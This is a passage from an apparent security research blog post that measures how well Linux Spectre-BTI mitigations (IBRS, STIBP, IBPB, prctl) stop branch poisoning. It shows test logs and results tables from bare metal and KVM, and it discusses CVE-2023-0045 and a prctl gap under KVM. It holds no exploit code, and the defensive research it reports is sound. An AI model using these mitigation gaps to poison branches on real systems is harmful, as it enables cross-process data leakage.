</span></span></code></pre></td></tr></table></div></div><p>For the mitigation test using the IA32_SPEC_CTRL MSR, we write the desired value to the register and check if the written value stays the same until the remainder of the test, otherwise the result is discarded. Sometimes the kernel may overwrite the value on the MSR, thus disabling the mitigation, but writing to the MSR before every branch disrupts the test flow and yields wrong results.</p><p>Example of a false positive:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Testing victim-IBRS on core 0:
</span></span><span class=line><span class=cl>current value msr[72]=0 on core 0
</span></span><span class=line><span class=cl>writing msr[72]=1 on core 0
</span></span><span class=line><span class=cl>current value msr[72]=1 on core 0
</span></span><span class=line><span class=cl>Rate: 0/1000  MSR[72]=1
</span></span><span class=line><span class=cl>Rate: 0/1000  MSR[72]=1
</span></span><span class=line><span class=cl>Rate: 667/1000  MSR[72]=0 //this bin should be discarded
</span></span><span class=line><span class=cl>Rate: 0/1000  MSR[72]=1
</span></span><span class=line><span class=cl>Rate: 0/1000  MSR[72]=1
</span></span><span class=line><span class=cl>Rate: 0/1000  MSR[72]=1
</span></span><span class=line><span class=cl>Rate: 0/1000  MSR[72]=1
</span></span><span class=line><span class=cl>Rate: 0/1000  MSR[72]=1
</span></span><span class=line><span class=cl>Rate: 0/1000  MSR[72]=1
</span></span><span class=line><span class=cl>Rate: 0/1000  MSR[72]=1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Total misspredict rate: 667/10000 (6.67 %) //actual misspredict rate = 0% (0/9000)
</span></span><span class=line><span class=cl>current value msr[72]=1 on core 0
</span></span></code></pre></td></tr></table></div></div><h3 id=no-mitigation>No mitigation<a hidden class=anchor aria-hidden=true href=#no-mitigation>#</a></h3><p>Then we execute the victim code on either core 0 or its sibling thread (core 4 in this case). For the control victim code the results are:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=go>Testing victim on core 0: 
</span></span></span><span class=line><span class=cl><span class=go>Rate: 998/1000  MSR[72]=0
</span></span></span><span class=line><span class=cl><span class=go>Rate: 997/1000  MSR[72]=0
</span></span></span><span class=line><span class=cl><span class=go>Rate: 1000/1000  MSR[72]=0
</span></span></span><span class=line><span class=cl><span class=go>Rate: 999/1000  MSR[72]=0
</span></span></span><span class=line><span class=cl><span class=go>Rate: 1000/1000  MSR[72]=0
</span></span></span><span class=line><span class=cl><span class=go>Rate: 1000/1000  MSR[72]=0
</span></span></span><span class=line><span class=cl><span class=go>Rate: 1000/1000  MSR[72]=0
</span></span></span><span class=line><span class=cl><span class=go>Rate: 1000/1000  MSR[72]=0
</span></span></span><span class=line><span class=cl><span class=go>Rate: 1000/1000  MSR[72]=0
</span></span></span><span class=line><span class=cl><span class=go>Rate: 1000/1000  MSR[72]=0
</span></span></span><span class=line><span class=cl><span class=go>Total mispredict rate: 9994/10000 (99.94 %)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>real	0m0,695s
</span></span></span><span class=line><span class=cl><span class=go>user	0m0,174s
</span></span></span><span class=line><span class=cl><span class=go>sys	0m0,000s
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Testing victim on core 4: 
</span></span></span><span class=line><span class=cl><span class=go>Rate: 1000/1000  MSR[72]=0
</span></span></span><span class=line><span class=cl><span class=go>Rate: 1000/1000  MSR[72]=0
</span></span></span><span class=line><span class=cl><span class=go>Rate: 1000/1000  MSR[72]=0
</span></span></span><span class=line><span class=cl><span class=go>Rate: 1000/1000  MSR[72]=0
</span></span></span><span class=line><span class=cl><span class=go>Rate: 1000/1000  MSR[72]=0
</span></span></span><span class=line><span class=cl><span class=go>Rate: 1000/1000  MSR[72]=0
</span></span></span><span class=line><span class=cl><span class=go>Rate: 1000/1000  MSR[72]=0
</span></span></span><span class=line><span class=cl><span class=go>Rate: 1000/1000  MSR[72]=0
</span></span></span><span class=line><span class=cl><span class=go>Rate: 1000/1000  MSR[72]=0
</span></span></span><span class=line><span class=cl><span class=go>Rate: 1000/1000  MSR[72]=0
</span></span></span><span class=line><span class=cl><span class=go>Total mispredict rate: 10000/10000 (100.00 %)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>real	0m0,744s
</span></span></span><span class=line><span class=cl><span class=go>user	0m0,235s
</span></span></span><span class=line><span class=cl><span class=go>sys	0m0,000s
</span></span></span></code></pre></td></tr></table></div></div><p>In this case, we observed a misprediction rate of 95%+, indicating that the attacker process can poison the victim branch.</p><p>Disabling the (in this case, the control, it was already disabled) mitigations using the MSR (obviously) returns similar results:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Testing victim-nospecctrl on core 0: 
</span></span><span class=line><span class=cl>current value msr[72]=0 on core 0
</span></span><span class=line><span class=cl>writing msr[72]=0 on core 0 
</span></span><span class=line><span class=cl>current value msr[72]=0 on core 0
</span></span><span class=line><span class=cl>Rate: 1000/1000  MSR[72]=0
</span></span><span class=line><span class=cl>[...]
</span></span><span class=line><span class=cl>Total misspredict rate: 9999/10000 (99.99 %)
</span></span><span class=line><span class=cl>current value msr[72]=0 on core 0
</span></span><span class=line><span class=cl>real	0m0,691s
</span></span><span class=line><span class=cl>user	0m0,168s
</span></span><span class=line><span class=cl>sys	0m0,000s
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Testing victim-nospecctrl on core 4: 
</span></span><span class=line><span class=cl>current value msr[72]=0 on core 4
</span></span><span class=line><span class=cl>writing msr[72]=0 on core 4 
</span></span><span class=line><span class=cl>current value msr[72]=0 on core 4
</span></span><span class=line><span class=cl>Rate: 998/1000  MSR[72]=0
</span></span><span class=line><span class=cl>[...]
</span></span><span class=line><span class=cl>Total misspredict rate: 9988/10000 (99.88 %)
</span></span><span class=line><span class=cl>current value msr[72]=0 on core 4
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>real	0m0,746s
</span></span><span class=line><span class=cl>user	0m0,234s
</span></span><span class=line><span class=cl>sys	0m0,000s
</span></span></code></pre></td></tr></table></div></div><h3 id=ibrs>IBRS<a hidden class=anchor aria-hidden=true href=#ibrs>#</a></h3><p>By using the msr-tools, we are able to write to the IA32_SPEC_CTRL MSR by writing to the file <code>/dev/cpu/&lt;cpu>/msr</code>. We have used Haswell CPU for the control test, in which by setting IBRS=1 mitigates all different spectre-BTI scenarios:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Testing victim-IBRS on core 0: 
</span></span><span class=line><span class=cl>current value msr[72]=0 on core 0
</span></span><span class=line><span class=cl>writing msr[72]=1 on core 0 
</span></span><span class=line><span class=cl>current value msr[72]=1 on core 0
</span></span><span class=line><span class=cl>[...]
</span></span><span class=line><span class=cl>Total misspredict rate: 0/10000 (0.00 %)
</span></span><span class=line><span class=cl>current value msr[72]=1 on core 0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>real	0m1,713s
</span></span><span class=line><span class=cl>user	0m0,731s
</span></span><span class=line><span class=cl>sys	0m0,094s
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Testing victim-IBRS on core 4: 
</span></span><span class=line><span class=cl>current value msr[72]=0 on core 4
</span></span><span class=line><span class=cl>writing msr[72]=1 on core 4 
</span></span><span class=line><span class=cl>current value msr[72]=1 on core 4
</span></span><span class=line><span class=cl>[...]
</span></span><span class=line><span class=cl>Total mispredict rate: 0/10000 (0.00 %)
</span></span><span class=line><span class=cl>current value msr[72]=1 on core 4
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>real	0m1,536s
</span></span><span class=line><span class=cl>user	0m0,984s
</span></span><span class=line><span class=cl>sys	0m0,037s
</span></span></code></pre></td></tr></table></div></div><p>For the IBRS tests, it&rsquo;s also possible to note a drastic performance decrease, from ~0.7s to ~1.5 seconds for both CPU threads; this indicates that probably speculative execution is disabled when IBRS is enabled. Commenting the line that flushes the target value for the branch improves the result, implying that the CPU spent less time on stalls in the pipeline:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ time sudo ./victim-IBRS 0x55555554123 0x55555555345 4
</span></span><span class=line><span class=cl>[...]
</span></span><span class=line><span class=cl>Total misspredict rate: 0/10000 (0.00 %)
</span></span><span class=line><span class=cl>current value msr[72]=0 on core 4
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>real    0m1,050s
</span></span><span class=line><span class=cl>user    0m0,005s
</span></span><span class=line><span class=cl>sys     0m0,005s
</span></span></code></pre></td></tr></table></div></div><h3 id=stibp>STIBP<a hidden class=anchor aria-hidden=true href=#stibp>#</a></h3><p>STIBP aims to mitigate only speculation between sibling threads so it&rsquo;s expected to not mitigate attacks running on the same core:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Testing victim-STIBP on core 0: 
</span></span><span class=line><span class=cl>current value msr[72]=1 on core 0
</span></span><span class=line><span class=cl>writing msr[72]=2 on core 0 
</span></span><span class=line><span class=cl>current value msr[72]=2 on core 0
</span></span><span class=line><span class=cl>[...]
</span></span><span class=line><span class=cl>Total misspredict rate: 6198/10000 (61.98 %)
</span></span><span class=line><span class=cl>current value msr[72]=2 on core 0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>real	0m1,102s
</span></span><span class=line><span class=cl>user	0m0,434s
</span></span><span class=line><span class=cl>sys	0m0,000s
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Testing victim-STIBP on core 4: 
</span></span><span class=line><span class=cl>current value msr[72]=0 on core 4
</span></span><span class=line><span class=cl>writing msr[72]=2 on core 4 
</span></span><span class=line><span class=cl>current value msr[72]=2 on core 4
</span></span><span class=line><span class=cl>[...]
</span></span><span class=line><span class=cl>Total misspredict rate: 0/10000 (0.00 %)
</span></span><span class=line><span class=cl>current value msr[72]=2 on core 4
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>real	0m0,744s
</span></span><span class=line><span class=cl>user	0m0,227s
</span></span><span class=line><span class=cl>sys	0m0,006s
</span></span></code></pre></td></tr></table></div></div><h3 id=ibpb>IBPB<a hidden class=anchor aria-hidden=true href=#ibpb>#</a></h3><p>In our tests with IBPB, before every sequence of 100 branches an IBPB is issued.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Testing victim-IBPB on core 0: 
</span></span><span class=line><span class=cl>current value msr[72]=2 on core 0
</span></span><span class=line><span class=cl>writing msr[72]=0 on core 0 
</span></span><span class=line><span class=cl>current value msr[72]=0 on core 0
</span></span><span class=line><span class=cl>[...]
</span></span><span class=line><span class=cl>Total misspredict rate: 0/10000 (0.00 %)
</span></span><span class=line><span class=cl>current value msr[72]=0 on core 0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>real	0m0,784s
</span></span><span class=line><span class=cl>user	0m0,259s
</span></span><span class=line><span class=cl>sys	0m0,000s
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Testing victim-IBPB on core 4: 
</span></span><span class=line><span class=cl>current value msr[72]=2 on core 4
</span></span><span class=line><span class=cl>writing msr[72]=0 on core 4 
</span></span><span class=line><span class=cl>current value msr[72]=0 on core 4
</span></span><span class=line><span class=cl>[...]
</span></span><span class=line><span class=cl>Total misspredict rate: 14/10000 (0.14 %)
</span></span><span class=line><span class=cl>current value msr[72]=0 on core 4
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>real	0m0,838s
</span></span><span class=line><span class=cl>user	0m0,248s
</span></span><span class=line><span class=cl>sys	0m0,074s
</span></span></code></pre></td></tr></table></div></div><p>In the SMT scenario, it&rsquo;s possible to observe some traces of speculation happening. This result is expected since after the flush of the BPU, thread 0 immediately executes a branch poisoning the BTB. However, due to the high frequency of IBPB’s in this test, it drastically reduces the speculation rate on the sibling thread. The Linux Kernel, when mitigating user-user branch injection attacks, only issues the IBPB on context switches and the sibling thread case is mitigated by STIBP (as recommended by Intel). Since we did not ensure such rigorous execution flow control when testing on usermode (we could have added synchronization but it was really not necessary for what we wanted to test), it&rsquo;s not possible to be sure that an attacker thread wouldn&rsquo;t be scheduled between a victim IBPB and a victim branch so this test may lead to some false positives, however, the results seem accurate enough.</p><h3 id=prctl>PRCTL<a hidden class=anchor aria-hidden=true href=#prctl>#</a></h3><p>As previously mentioned, the PRCTL syscall allows setting the speculative control for a given process <sup id=fnref1:5><a href=#fn:5 class=footnote-ref role=doc-noteref>5</a></sup>. The following call can be used to mitigate spectre-BTI attacks against an user process:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-.c data-lang=.c><span class=line><span class=cl><span class=nf>prctl</span><span class=p>(</span><span class=n>PR_SET_SPECULATION_CTRL</span><span class=p>,</span> <span class=n>PR_SPEC_INDIRECT_BRANCH</span><span class=p>,</span> <span class=n>PR_SPEC_FORCE_DISABLE</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>The Linux kernel uses a combination of the previous hardware mitigations (STIBP+IBPB) to protect the process from spectre-BTI attacks. This is expected to fully protect the victim:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Testing victim-PRCTL on core 0: 
</span></span><span class=line><span class=cl>PRCTL GET value 0x9
</span></span><span class=line><span class=cl>Rate: 0/1000  MSR[72]=2
</span></span><span class=line><span class=cl>[...]
</span></span><span class=line><span class=cl>Rate: 0/1000  MSR[72]=2
</span></span><span class=line><span class=cl>Total misspredict rate: 0/10000 (0.00 %)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>real	0m0,744s
</span></span><span class=line><span class=cl>user	0m0,200s
</span></span><span class=line><span class=cl>sys	0m0,022s
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Testing victim-PRCTL on core 4: 
</span></span><span class=line><span class=cl>PRCTL GET value 0x9
</span></span><span class=line><span class=cl>Rate: 0/1000  MSR[72]=2
</span></span><span class=line><span class=cl>[...]
</span></span><span class=line><span class=cl>Rate: 0/1000  MSR[72]=2
</span></span><span class=line><span class=cl>Total misspredict rate: 0/10000 (0.00 %)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>real	0m0,744s
</span></span><span class=line><span class=cl>user	0m0,222s
</span></span><span class=line><span class=cl>sys	0m0,013s
</span></span></code></pre></td></tr></table></div></div><h3 id=conclusion-table>Conclusion Table:<a hidden class=anchor aria-hidden=true href=#conclusion-table>#</a></h3><p>Ubuntu 22.04.1 LTS:</p><p>Kernel is Linux 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64</p><p>CPU is Intel(R) Core(TM) i7-4790 CPU @ 3.60GHz</p><h4 id=results-for-control-test-setup-bare-metal>Results for Control Test Setup (Bare Metal):<a hidden class=anchor aria-hidden=true href=#results-for-control-test-setup-bare-metal>#</a></h4><table><thead><tr><th>Mitigation</th><th>Same Core</th><th>SMT</th><th>Expected?</th></tr></thead><tbody><tr><td>No mitigation</td><td>99.99 %</td><td>99.88 %</td><td>Yes</td></tr><tr><td>IBRS</td><td>0.00 %</td><td>0.00 %</td><td>Yes</td></tr><tr><td>STIBP</td><td>61.98 %</td><td>0.00 %</td><td>Yes</td></tr><tr><td>IBPB</td><td>0.00 %</td><td>0.14 %</td><td>Yes</td></tr><tr><td>PRCTL</td><td>0.00 %</td><td>0.00 %</td><td>Yes</td></tr></tbody></table><h4 id=cve-2023-0045-bypassing-spectre-bti-user-space-mitigations-on-linux-15>CVE 2023-0045 Bypassing Spectre-BTI User Space Mitigations on Linux <sup id=fnref:15><a href=#fn:15 class=footnote-ref role=doc-noteref>15</a></sup><a hidden class=anchor aria-hidden=true href=#cve-2023-0045-bypassing-spectre-bti-user-space-mitigations-on-linux-15>#</a></h4><p>In some tests it was detected traces of speculative execution when using PRCTL as mitigation and seting the attacker on the same core. Further research explaned this behaviour due a Kernel bug. Previous implementation of the mitigation only marks the process as protected and dont issue the IBPB during the syscall. this leaves the process unprotected until the next schedule, thus allowing the process to execute for a short period using values already present on the BTB.</p><h2 id=tests-on-kvm>Tests on KVM<a hidden class=anchor aria-hidden=true href=#tests-on-kvm>#</a></h2><p>In the same Bare Metal machine, we set up a KVM virtual machine with an ubuntu 22.04.5 image:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>virt</span><span class=o>-</span><span class=n>install</span> <span class=o>-</span><span class=n>n</span> <span class=n>ubuntu22</span> <span class=o>--</span><span class=n>ram</span><span class=o>=</span><span class=mi>1024</span> <span class=o>--</span><span class=n>vcpus</span><span class=o>=</span><span class=mi>2</span> <span class=o>--</span><span class=n>disk</span> <span class=n>bus</span><span class=o>=</span><span class=n>virtio</span><span class=p>,</span><span class=n>size</span><span class=o>=</span><span class=mi>10</span> <span class=o>--</span><span class=n>graphics</span> <span class=n>none</span> <span class=o>--</span><span class=n>location</span><span class=o>=/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>libvirt</span><span class=o>/</span><span class=n>images</span><span class=o>/</span><span class=n>ubuntu</span><span class=o>-</span><span class=mf>22.04</span><span class=o>.</span><span class=mi>1</span><span class=o>-</span><span class=n>live</span><span class=o>-</span><span class=n>server</span><span class=o>-</span><span class=n>amd64</span><span class=o>.</span><span class=n>iso</span> <span class=o>--</span><span class=n>extra</span><span class=o>-</span><span class=n>args</span><span class=o>=</span><span class=s1>&#39;console=ttyS0&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>//</span><span class=n>The</span> <span class=mi>2</span> <span class=n>vcpus</span> <span class=n>are</span> <span class=n>pinned</span> <span class=n>to</span> <span class=n>siblings</span> <span class=n>on</span> <span class=n>the</span> <span class=n>host</span> <span class=n>machine</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>virsh</span> <span class=n>vcpuinfo</span> <span class=n>ubuntutest22</span>
</span></span><span class=line><span class=cl><span class=n>VCPU</span><span class=p>:</span>           <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>CPU</span><span class=p>:</span>            <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>State</span><span class=p>:</span>          <span class=n>running</span>
</span></span><span class=line><span class=cl><span class=n>CPU</span> <span class=n>time</span><span class=p>:</span>       <span class=mi>17</span><span class=p>,</span><span class=mi>9</span><span class=n>s</span>
</span></span><span class=line><span class=cl><span class=n>CPU</span> <span class=n>Affinity</span><span class=p>:</span>   <span class=n>y</span><span class=o>-------</span>
</span></span><span class=line><span class=cl><span class=n>VCPU</span><span class=p>:</span>           <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>CPU</span><span class=p>:</span>            <span class=mi>4</span>
</span></span><span class=line><span class=cl><span class=n>State</span><span class=p>:</span>          <span class=n>running</span>
</span></span><span class=line><span class=cl><span class=n>CPU</span> <span class=n>time</span><span class=p>:</span>       <span class=mi>11</span><span class=p>,</span><span class=mi>9</span><span class=n>s</span>
</span></span><span class=line><span class=cl><span class=n>CPU</span> <span class=n>Affinity</span><span class=p>:</span>   <span class=o>----</span><span class=n>y</span><span class=o>---</span>
</span></span></code></pre></td></tr></table></div></div><p>The spectre-meltdown checker output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Checking for vulnerabilities on current system
</span></span><span class=line><span class=cl>Kernel is Linux 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
</span></span><span class=line><span class=cl>CPU is Intel(R) Core(TM) i7-4790 CPU @ 3.60GHz
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Hardware check
</span></span><span class=line><span class=cl>* Hardware support (CPU microcode) for mitigation techniques
</span></span><span class=line><span class=cl>  * Indirect Branch Restricted Speculation (IBRS)
</span></span><span class=line><span class=cl>    * SPEC_CTRL MSR is available:  YES
</span></span><span class=line><span class=cl>    * CPU indicates IBRS capability:  YES  (SPEC_CTRL feature bit)
</span></span><span class=line><span class=cl>  * Indirect Branch Prediction Barrier (IBPB)
</span></span><span class=line><span class=cl>    * CPU indicates IBPB capability:  YES  (SPEC_CTRL feature bit)
</span></span><span class=line><span class=cl>  * Single Thread Indirect Branch Predictors (STIBP)
</span></span><span class=line><span class=cl>    * SPEC_CTRL MSR is available:  YES
</span></span><span class=line><span class=cl>    * CPU indicates STIBP capability:  YES  (Intel STIBP feature bit)
</span></span><span class=line><span class=cl>    [...]
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>CVE-2017-5715 aka &#39;Spectre Variant 2, branch target injection&#39;
</span></span><span class=line><span class=cl>* Mitigated according to the /sys interface:  YES  (Mitigation: Retpolines, IBPB: conditional, IBRS_FW, STIBP: disabled, RSB filling, PBRSB-eIBRS: Not affected)
</span></span><span class=line><span class=cl>* Mitigation 1
</span></span><span class=line><span class=cl>  * Kernel is compiled with IBRS support:  YES
</span></span><span class=line><span class=cl>    * IBRS enabled and active:  YES  (for firmware code only)
</span></span><span class=line><span class=cl>  * Kernel is compiled with IBPB support:  YES
</span></span><span class=line><span class=cl>    * IBPB enabled and active:  YES
</span></span><span class=line><span class=cl>* Mitigation 2
</span></span><span class=line><span class=cl>  * Kernel has branch predictor hardening (arm):  NO
</span></span><span class=line><span class=cl>  * Kernel compiled with retpoline option:  YES
</span></span><span class=line><span class=cl>    * Kernel compiled with a retpoline-aware compiler:  YES  (kernel reports full retpoline compilation)
</span></span><span class=line><span class=cl>&gt; STATUS:  NOT VULNERABLE  (Full retpoline + IBPB are mitigating the vulnerability)
</span></span></code></pre></td></tr></table></div></div><h4 id=results-for-baremetal-kvm>Results for baremetal-kvm:<a hidden class=anchor aria-hidden=true href=#results-for-baremetal-kvm>#</a></h4><table><thead><tr><th>Mitigation</th><th>NOSMT</th><th>SMT</th><th>Expected?</th></tr></thead><tbody><tr><td>No mitigation</td><td>99.95 %</td><td>99.99 %</td><td>Yes</td></tr><tr><td>IBRS</td><td>0.00 %</td><td>0.00 %</td><td>Yes</td></tr><tr><td>STIBP</td><td>99.98 %</td><td>0.01 %</td><td>Yes</td></tr><tr><td>IBPB</td><td>0.00 %</td><td>98.68 %</td><td>Yes</td></tr><tr><td>PRCTL</td><td>0.01 %</td><td>99.98 %</td><td>No</td></tr></tbody></table><p>The tests showed something unexpected: all mitigations worked properly when tested individually, but the prctl is not setting the STIBP MSR like it does when executed in the host, leaving it vulnerable to SMT attacks:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
